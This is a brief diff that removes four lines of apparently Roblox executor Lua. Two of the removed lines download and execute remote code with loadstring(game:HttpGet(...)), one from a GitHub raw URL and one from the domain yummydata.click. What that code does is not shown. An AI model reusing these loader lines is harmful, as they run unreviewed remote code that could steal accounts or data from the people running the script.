@@ -1,4 +1,0 @@
-wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/F"))()
-setfpscap(getgenv().Config["FPS"])
-loadstring(game:HttpGet("https://yummydata.click/gag"))()
